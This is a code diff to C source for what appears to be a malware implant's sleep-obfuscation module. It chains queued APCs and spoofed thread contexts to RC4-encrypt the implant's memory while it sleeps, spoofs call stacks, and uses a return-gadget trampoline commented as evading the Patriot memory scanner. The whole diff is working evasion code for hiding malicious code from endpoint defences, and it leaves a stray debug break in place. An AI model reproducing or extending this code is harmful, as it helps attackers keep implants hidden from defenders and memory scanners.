@@ -77,6 +77,7 @@ typedef struct {
     NTSTATUS CFG;
     DWORD    dwMilliseconds;
     UCHAR    enckey[KEY_SIZE];
+    DWORD64  BackupPageSize;
 
 } API, *PAPI;
 
@@ -140,7 +141,7 @@ SECTION( D ) VOID handleCFG( PAPI pApi )
 SECTION( D ) NTSTATUS queueAPCs( PAPI pApi, PCONTEXT* contexts, HANDLE hThread )
 {
     NTSTATUS Status;
-    for( int i = 13; i >= 0; i-- )
+    for( int i = 17; i >= 0; i-- )
     {
         Status = SPOOF( pApi->ntdll.NtQueueApcThread, NULL, NULL, hThread, C_PTR( pApi->ntdll.NtContinue ), contexts[i], NULL, NULL );
         if( Status != STATUS_SUCCESS )
@@ -156,12 +157,12 @@ SECTION( D ) VOID initContexts( PAPI pApi, PCONTEXT* contexts )
 {
     PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
 
-    for( int i = 16; i >= 0; i-- )
+    for( int i = 20; i >= 0; i-- )
     {
         contexts[i] = ( PCONTEXT )C_PTR( SPOOF( pApi->ntdll.RtlAllocateHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, C_PTR( HEAP_ZERO_MEMORY ), C_PTR( sizeof( CONTEXT ) ) ) );
-        if( i < 14 )
+        if( i < 18 )
         {
-            *contexts[i] = *contexts[15];
+            *contexts[i] = *contexts[19];
         };
         contexts[i]->ContextFlags = CONTEXT_FULL;
     };
@@ -171,7 +172,7 @@ SECTION( D ) VOID freeContexts( PAPI pApi, PCONTEXT* contexts )
 {
     PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
 
-    for( int i = 0; i < 17; i++ )
+    for( int i = 0; i < 21; i++ )
     {
         if( contexts[i] )
         {
@@ -192,9 +193,9 @@ SECTION( D ) VOID startSleepChain( PAPI pApi, HANDLE hThread, HANDLE hEvent )
 
 SECTION( D ) VOID addCommonStackData( PAPI pApi, PCONTEXT* contexts )
 {
-    for( int i = 0; i < 14; i++ )
+    for( int i = 0; i < 18; i++ )
     {
-        contexts[i]->Rsp = U_PTR( contexts[15]->Rsp - ( 0x1000 * ( i + 1 ) ) );
+        contexts[i]->Rsp = U_PTR( contexts[19]->Rsp - ( 0x1000 * ( i + 1 ) ) );
         *( ULONG_PTR * )( contexts[i]->Rsp + 0x00 ) = ( ULONG_PTR ) pApi->ntdll.NtTestAlert;
     };
 };
@@ -250,7 +251,7 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     HANDLE                  WaitThd  = NULL;
     HANDLE                  OrigThd  = NULL;
     ULONG                   OldProt  = 0;
-    PCONTEXT                Contexts[17]; // APC CTXs 0-13, Original CTX, Sleep CTX, Fake CTX
+    PCONTEXT                Contexts[21]; // APC CTXs 0-17, Original CTX, Sleep CTX, Fake CTX
     UCHAR                   EmptyStk[256];
     USTRING                 S32Key;
     USTRING                 S32Data;
@@ -269,8 +270,8 @@ SECTION( D ) VOID delayExec( PAPI pApi )
 
     S32Key.len  = S32Key.maxlen = KEY_SIZE;
     S32Key.str  = pApi->enckey;
-    S32Data.len = S32Data.maxlen = pApi->Length;
-    S32Data.str = ( PBYTE )( pApi->Buffer );
+    S32Data.len = S32Data.maxlen = pApi->BackupPageSize;
+    S32Data.str = ( PBYTE )( pApi->OriginalText );
 
     // Prep the Foliage
     Status = setupThreads( pApi, &OrigThd, &WaitThd );
@@ -281,16 +282,16 @@ SECTION( D ) VOID delayExec( PAPI pApi )
 
     initContexts( pApi, Contexts );
 
-    Status = SPOOF( pApi->ntdll.NtGetContextThread, NULL, NULL, WaitThd, Contexts[15] );
+    Status = SPOOF( pApi->ntdll.NtGetContextThread, NULL, NULL, WaitThd, Contexts[19] );
     CHECKERR( Status );
 
     addCommonStackData( pApi, Contexts );
     Trampoline = FindGadget( pApi->hNtdll, pApi->szNtdll );
 
-    Contexts[16]->Rip = U_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
-    Contexts[16]->Rsp = U_PTR( &EmptyStk );
+    Contexts[20]->Rip = U_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
+    Contexts[20]->Rsp = U_PTR( &EmptyStk );
 
-    DWORD c = 13; 
+    DWORD c = 17; 
     Contexts[c]->Rip = U_PTR( pApi->ntdll.NtWaitForSingleObject );
     Contexts[c]->Rcx = U_PTR( SyncEvt );
     Contexts[c]->Rdx = U_PTR( FALSE );
@@ -306,9 +307,11 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;
 
     c--;
-    // Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
-    // Contexts[c]->Rcx = U_PTR( &S32Data );
-    // Contexts[c]->Rdx = U_PTR( &S32Key );
+    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
+    Contexts[c]->Rcx = U_PTR( &S32Data );
+    Contexts[c]->Rdx = U_PTR( &S32Key );
+
+    c--;
     Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlCopyMemory );
     Contexts[c]->Rcx = U_PTR( pApi->ExecRegion );
     Contexts[c]->Rdx = U_PTR( pApi->Buffer );
@@ -319,6 +322,11 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     Contexts[c]->Rcx = U_PTR( pApi->Buffer );
     Contexts[c]->Rdx = U_PTR( pApi->OriginalText );
     Contexts[c]->R8  = U_PTR( pApi->OriginalTextSize );
+
+    c--;
+    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
+    Contexts[c]->Rcx = U_PTR( &S32Data );
+    Contexts[c]->Rdx = U_PTR( &S32Key );
 
     c--;
     Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
@@ -332,22 +340,16 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     c--;
     Contexts[c]->Rip = U_PTR( pApi->ntdll.NtGetContextThread );
     Contexts[c]->Rcx = U_PTR( OrigThd );
-    Contexts[c]->Rdx = U_PTR( Contexts[14] ); // Original Context
+    Contexts[c]->Rdx = U_PTR( Contexts[18] ); // Original Context
 
     c--;
     Contexts[c]->Rip = U_PTR( pApi->ntdll.NtSetContextThread );
     Contexts[c]->Rcx = U_PTR( OrigThd );
-    Contexts[c]->Rdx = U_PTR( Contexts[16] ); // Fake Context
+    Contexts[c]->Rdx = U_PTR( Contexts[20] ); // Fake Context
 
     c--;
     Contexts[c]->Rip = U_PTR( pApi->k32.Sleep );
     Contexts[c]->Rcx = U_PTR( pApi->dwMilliseconds );
-
-    // c--;
-    // Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
-    // Contexts[c]->Rcx = U_PTR( &S32Data );
-    // Contexts[c]->Rdx = U_PTR( &S32Key );
-
 
     c--;
     Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
@@ -362,6 +364,11 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlZeroMemory );
     Contexts[c]->Rcx = U_PTR( pApi->Buffer );
     Contexts[c]->Rdx = U_PTR( pApi->OriginalTextSize );
+
+    c--;
+    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
+    Contexts[c]->Rcx = U_PTR( &S32Data );
+    Contexts[c]->Rdx = U_PTR( &S32Key );
     
     c--;
     Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlCopyMemory );
@@ -370,9 +377,14 @@ SECTION( D ) VOID delayExec( PAPI pApi )
     Contexts[c]->R8  = U_PTR( pApi->Length );
 
     c--;
+    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
+    Contexts[c]->Rcx = U_PTR( &S32Data );
+    Contexts[c]->Rdx = U_PTR( &S32Key );
+
+    c--;
     Contexts[c]->Rip = U_PTR( pApi->ntdll.NtSetContextThread );
     Contexts[c]->Rcx = U_PTR( OrigThd );
-    Contexts[c]->Rdx = U_PTR( Contexts[14] ); // Original Context
+    Contexts[c]->Rdx = U_PTR( Contexts[18] ); // Original Context
 
     c--;
     Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
@@ -498,7 +510,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
     if( !pApi->hAdvapi )
     {
         pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"advapi32.dll" ) ) );
-        SPOOF( pApi->ntdll.LdrLoadDll, NULL, NULL, C_PTR( 0 ), &Uni, &pApi->hAdvapi );
+        SPOOF( pApi->ntdll.LdrLoadDll, NULL, NULL, NULL, C_PTR( 0 ), &Uni, &pApi->hAdvapi );
 
         if( !pApi->hAdvapi )
         {
@@ -515,30 +527,26 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
     return STATUS_SUCCESS;
 };
 
-SECTION( D ) VOID generateEncryptionKey( PAPI pApi )
-{
-    ULONG Seed = 1337;
-    for( int i = 0; i < KEY_SIZE; i++ )
-    {
-        Seed = pApi->ntdll.RtlRandomEx( &Seed );
-        pApi->enckey[i] = ( char )KEY_VALS[Seed % 61];
-    };
-};
-
 SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds ) 
 {
     API                 Api;
 
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
 
-    Api.CFG            = 0;
-    Api.dwMilliseconds = dwMilliseconds;
-    Api.Buffer         = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
-    Api.Length         = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );
-    Api.ExecRegion     = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegion );
-    Api.ExecRegionSize = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegionSize );
+    Api.CFG              = 0;
+    Api.dwMilliseconds   = dwMilliseconds;
+    Api.Buffer           = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
+    Api.Length           = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );
+    Api.ExecRegion       = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegion );
+    Api.ExecRegionSize   = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegionSize );
     Api.OriginalText     = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->OriginalText );
     Api.OriginalTextSize = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->OriginalTextSize );
+    Api.BackupPageSize   = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->BackupPageSize );
+
+    for ( int i = 0; i < KEY_SIZE ; i++ )
+    {
+        Api.enckey[i]    = ( ( PSTUB ) OFFSET( Stub ) )->Key[i];
+    }
 
     if( resolveSleepHookFunctions( &Api ) == STATUS_SUCCESS )
     {
@@ -550,8 +558,8 @@ SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
             return;
         };
 
-        generateEncryptionKey( &Api );
         encryptHeap( &Api );
+        __debugbreak();
         delayExec( &Api );
         encryptHeap( &Api );
     };
